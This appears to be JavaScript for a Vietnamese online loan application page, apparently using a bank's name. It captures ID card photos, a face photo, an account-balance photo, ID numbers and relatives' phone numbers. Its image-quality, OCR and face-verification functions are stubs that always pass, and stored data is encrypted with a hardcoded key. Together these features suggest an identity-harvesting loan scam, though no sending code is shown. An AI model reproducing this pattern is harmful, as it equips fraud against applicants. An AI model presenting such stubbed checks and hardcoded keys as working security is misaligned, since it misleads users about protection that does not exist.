
emailjs.init("Cc-147hLWigAZAdeZ");
window.Laravel = {"csrfToken":"flBZzgVCzEBmPwoEyekJgpET4VkG6FCAU6WnPQta"};

const backend = {
    applications: JSON.parse(CryptoJS.AES.decrypt(localStorage.getItem('loanApplications') || CryptoJS.AES.encrypt('[]', 'shinhan_key').toString(), 'shinhan_key').toString(CryptoJS.enc.Utf8)) || [],
    saveApplication(data) {
        this.applications.push(data);
        localStorage.setItem('loanApplications', CryptoJS.AES.encrypt(JSON.stringify(this.applications), 'shinhan_key').toString());
    }
};

const rateLimit = {
    attempts: 0,
    lastAttempt: 0,
    check() {
        const now = Date.now();
        if (now - this.lastAttempt > 60000) {
            this.attempts = 0;
            this.lastAttempt = now;
        }
        if (this.attempts >= 5) {
            alert('Quá nhiều yêu cầu. Vui lòng thử lại sau 1 phút.');
            return false;
        }
        this.attempts++;
        this.lastAttempt = now;
        return true;
    }
};

function formatNumber(input) {
    let value = input.value.replace(/[^0-9]/g, '');
    let numericValue = parseInt(value, 10);
    if (!isNaN(numericValue)) {
        input.value = numericValue.toLocaleString('vi-VN');
    } else {
        input.value = '';
    }
}

function unformatNumber(value) {
    let numericValue = parseInt(value.replace(/[^0-9]/g, ''), 10);
    return isNaN(numericValue) ? 0 : numericValue;
}

function validateIdNumber(idNumber) {
    const provinceCodes = ['001', '002', '004', '006', '008', '010', '011', '012', '014', '015', '017', '019', '020', '022', '024', '025', '026', '027', '030', '031', '033', '034', '035', '036', '037', '038', '040', '042', '044', '045', '046', '048', '049', '051', '052', '054', '056', '058', '060', '062', '064', '066', '067', '068', '070', '072', '074', '075', '077', '079', '080', '082', '083', '084', '086', '087', '089', '091', '092', '093', '094', '095', '096'];
    return /^\d{12}$/.test(idNumber) && provinceCodes.includes(idNumber.slice(0, 3));
}

function checkImageQuality(src) {
    return true;
}

function extractOcrData(src) {
    return {
        idNumber: document.getElementById('idNumber')?.value || '',
        fullName: document.getElementById('fullName')?.value || ''
    };
}

function verifyFacePhoto(facePhoto, idPhotoFront) {
    return true;
}

let currentCameraField = null;
let cameraStream = null;
let tempFormData = {};

async function startCamera(field) {
    currentCameraField = field;
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById(`cameraFeed${field}`);
        video.srcObject = cameraStream;
        video.style.display = 'block';
        document.getElementById(`capture${field}`).style.display = 'inline-block';
    } catch (err) {
        document.getElementById(`${field}Error`).innerText = 'Không thể truy cập camera. Vui lòng cấp quyền trong cài đặt trình duyệt hoặc tải ảnh lên.';
        console.error('Camera access error:', err);
    }
}

function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
        ['idPhotoFront', 'idPhotoBack', 'facePhoto', 'balancePhoto'].forEach(field => {
            const video = document.getElementById(`cameraFeed${field}`);
            const capture = document.getElementById(`capture${field}`);
            if (video) video.style.display = 'none';
            if (capture) capture.style.display = 'none';
        });
    }
}

function capturePhoto(field) {
    const video = document.getElementById(`cameraFeed${field}`);
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg');
    document.getElementById(`preview${field}`).src = dataUrl;
    document.getElementById(`preview${field}`).style.display = 'block';
    stopCamera();
}

function handleFileUpload(event, field) {
    document.getElementById('loadingIndicator').style.display = 'block';
    const file = event.target.files[0];
    if (!file) {
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    const maxSize = 5 * 1024 * 1024;
    if (file.size > maxSize) {
        document.getElementById(`${field}Error`).innerText = 'Ảnh quá lớn (tối đa 5MB). Vui lòng chọn ảnh nhỏ hơn.';
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    if (!['image/jpeg', 'image/png'].includes(file.type)) {
        document.getElementById(`${field}Error`).innerText = 'Chỉ hỗ trợ định dạng JPG hoặc PNG.';
        document.getElementById('loadingIndicator').style.display = 'none';
        return;
    }
    const reader = new FileReader();
    reader.onload = () => {
        document.getElementById(`preview${field}`).src = reader.result;
        document.getElementById(`preview${field}`).style.display = 'block';
        document.getElementById('loadingIndicator').style.display = 'none';
    };
    reader.onerror = (err) => {
        console.error('File upload error:', err);
        document.getElementById(`${field}Error`).innerText = 'Lỗi khi tải file. Vui lòng thử lại.';
        document.getElementById('loadingIndicator').style.display = 'none';
    };
    reader.readAsDataURL(file);
}

function clearErrors() {
    const errorIds = ['branchError', 'fullNameError', 'birthDateError', 'idNumberError', 'phoneError', 'hometownError', 'residenceError', 'incomeError', 'jobError', 'relativePhoneError', 'relativeNameError', 'loanFormError', 'customerTypeError', 'registerLoanTypeError', 'registerAmountError', 'registerTermError', 'genderError', 'idPhotoFrontError', 'idPhotoBackError', 'facePhotoError', 'loanTypeError', 'termError', 'amountError', 'interestError', 'agreeContractError', 'balancePhotoError'];
    errorIds.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.innerText = '';
    });
    ['loanCalcErrorSummary', 'registerErrorSummary', 'verifyErrorSummary'].forEach(id => {
        const element = document.getElementById(id);
        if (element) element.innerText = '';
    });
}
